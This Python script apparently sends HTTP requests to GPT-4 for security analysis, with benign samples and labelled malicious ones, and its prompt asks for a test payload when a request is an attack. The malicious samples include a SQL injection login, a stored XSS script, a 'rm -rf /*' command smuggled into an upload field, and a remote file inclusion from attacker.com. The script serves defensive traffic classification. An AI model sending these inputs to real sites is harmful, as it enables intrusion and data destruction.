import openai 

# Add your individual API key
openai.api_key = ""


def analyze_http_traffic(http_request: str):
    """
    Sends an HTTP request to the LLM for analysis.
    """
    prompt = f"""
    Analyze the following HTTP request and provide:
    - A breakdown of its components (method, headers, payload, etc.).
    - A security assessment (Is it normal, suspicious, or malicious?).
    - Identified vulnerabilities (SQLi, XSS, etc.), if any.
    - If malicious, suggest a security patch.
    - If an attack, generate a test payload.
    
    HTTP Request:
    {http_request}
    """
    
    response = openai.chat.completions.create(
        model="gpt-4",
        messages=[
            {"role": "system", "content": "You are a cybersecurity analyst."},
            {"role": "user", "content": prompt},
        ]
    )
    
    return response.choices[0].message.content

# Example HTTP Requests (Benign)
sample_normal_get_request = r"""
GET /about HTTP/1.1
Host: example-website.com
User-Agent: Mozilla/5.0
Accept: text/html
"""

sample_normal_login_request = r"""
POST /login HTTP/1.1
Host: example-website.com
User-Agent: Mozilla/5.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 41

username=john_doe&password=securePassword123
"""
sample_normal_form_request = r"""
POST /contact HTTP/1.1
Host: example-website.com
User-Agent: Mozilla/5.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 94

name=John%20Doe&email=john.doe@example.com&message=I%20have%20a%20question%20about%20your%20service
"""

sample_normal_file_download_request = r"""
GET /files/document.pdf HTTP/1.1
Host: example-website.com
User-Agent: Mozilla/5.0
Accept: application/pdf
"""

# Example HTTP Requests (Malicious)
sample_sql_request = r"""
POST /login HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 40

\username=admin&password=' OR '1'='1
"""

sample_xss_request = r"""
POST /comment HTTP/1.1
Host: vulnerable-website.com
User-Agent: Mozilla/5.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 98

username=attacker&comment=<script>alert('XSS Attack');</script>
"""

sample_command_injection_request = r"""
POST /upload HTTP/1.1
Host: vulnerable-website.com
User-Agent: Mozilla/5.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 67

file_name=somefile.txt&file_content=;rm%20-rf%20/*&submit=Upload
"""

sample_file_upload_request = r"""
POST /load_file.php HTTP/1.1
Host: vulnerable-website.com
User-Agent: Mozilla/5.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 72

file_url=http://attacker.com/malicious_file.php
"""

sample_buffer_overflow_request = r"""
POST /submit_form HTTP/1.1
Host: vulnerable-website.com
User-Agent: Mozilla/5.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 4096

input_field=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA... (4096 bytes of 'A')
"""

# Analyze the request [Change variable name according to request type]
analysis_result = analyze_http_traffic(sample_normal_get_request)
print("\n=== LLM Analysis ===\n")
print(analysis_result)
